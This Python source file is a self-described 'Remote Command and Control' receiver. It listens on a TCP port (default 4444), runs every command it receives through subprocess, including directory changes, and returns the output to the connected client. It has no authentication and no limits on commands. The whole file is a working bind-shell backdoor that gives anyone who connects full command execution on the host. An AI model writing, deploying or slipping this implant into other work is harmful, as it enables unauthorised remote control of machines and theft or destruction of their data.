import sys
import socket
import subprocess
import shlex
import os
import argparse

def main():
    # command line arguments
    parser = argparse.ArgumentParser(description="Receiver for Remote Command and Control Suite")
    parser.add_argument("address", nargs='?', default='localhost', help="IP Address of this machine (optional, default: %(default)s)")
    parser.add_argument("port", nargs='?', type=int, default=4444, help="Port to listen on (optional, default: %(default)s)")
    args = parser.parse_args()

    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Bind the socket to the host and port
    server_socket.bind((args.address, args.port))

    # Listen for incoming connections
    server_socket.listen(1)
    print("Server listening on {}:{}".format(*server_socket.getsockname()))
    
    # wait for first connection
    client_socket, client_address = server_socket.accept()

    while True:
        # receive data
        received_data = client_socket.recv(4096)
        if len(received_data) > 0:

            received_message = received_data.decode()
            args = shlex.split(received_message)

            # special case because cd is a shell built-in
            if args[0] == 'cd':
                if len(args) > 1 :
                    os.chdir(args[1])
                client_socket.send(" \b".encode())
            else:
                try:
                    proc = subprocess.run(args, capture_output=True, check=True)

                    if len(proc.stdout) > 0:
                        client_socket.sendall(proc.stdout)
                    else:
                        client_socket.send(" \b".encode())
                except subprocess.CalledProcessError as error:
                    client_socket.send(error.stderr)
                except OSError:
                    client_socket.send("Command not found\n".encode())
                except Exception as e:
                    client_socket.send("---UNHANDLED EXCEPTION -> {}".format(str(e)).encode())

        else:
            # if no data was received, or if the client closed the connection, reset the socket
            client_socket.close()
            client_socket, client_address = server_socket.accept()

        sys.stdout.flush()

if __name__ == "__main__":
    main()
